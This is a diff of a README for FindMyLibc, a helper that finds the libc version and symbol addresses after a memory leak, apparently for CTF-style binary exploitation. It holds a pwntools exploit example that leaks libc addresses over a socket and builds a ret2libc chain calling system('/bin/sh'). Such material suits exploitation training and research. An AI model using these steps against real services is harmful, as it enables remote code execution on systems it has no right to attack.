@@ -1,18 +1,35 @@
 # FindMyLibc
-Get the specific libc version+addresses after a memory leak
+You're exploiting a binary, you've found an address leak, now you need the libc version  
+and most importantly, the addresses of symbols like `system` and `str_bin_sh`.
 
-# Disclaimer
+This tool is the easiest to setup & use!  
+The shortest path to victory 🏆
+
+## Disclaimer
 This was tested only on 32-bit binary, so it might not work properly on 64-bit binaries.  
 Would be updated!
 
+# Setup
+Download this repo:  
+```
+git clone https://github.com/omrina/FindMyLibc.git
+```  
+Then just import:  
+```
+from FindMyLibc import *
+```    
+And use the only function you need:
+```
+matching_libc = find_libc(elf, leak_libc_address)
+```  
+
+See below the example.
+
 # Example
 Here's a simple example of exploit script (see [`./example.py`](https://github.com/omrina/FindMyLibc/blob/main/example.py)).
-<details>
-<summary>
-  from pwn import * ... elf = ELF("./elf_name") ...
-</summary>
-<br>
-  
+
+### Setup your binary exploit script:
+Whatever you need...
 ```
 from pwn import *
 from FindMyLibc import *
@@ -23,8 +40,8 @@ host = args.HOST or 'localhost'
 port = int(args.PORT or 5555)
 io = connect(host, port)
 ```
-</details>
-We need to set up a "leak address" function:
+
+### We need to set up a "leak address" function:
 
 ```
 # Payload until right before the return address
@@ -41,8 +58,7 @@ def leak_libc_address(symbol_name):
 
     return u64(received.ljust(8, b"\x00"))
 ```
-
-Now the real deal:
+### Now the real deal:
 ```
 # call `find_libc`, it returns a list of matching libc candidates.
 matching_libc = find_libc(elf, leak_libc_address)
@@ -68,6 +84,7 @@ What is `chosen_lib`:
 
 ![image](https://github.com/user-attachments/assets/06ff78eb-f59b-4ba6-b199-079e0e091781)
 
+### How do we use the results:
 You would probably need only `syms`, each value is the integer of the calcualted address, so you can use it like:
 ```
 shell_rop = p32(system_address) + b'EEEE' + p32(binsh_address)
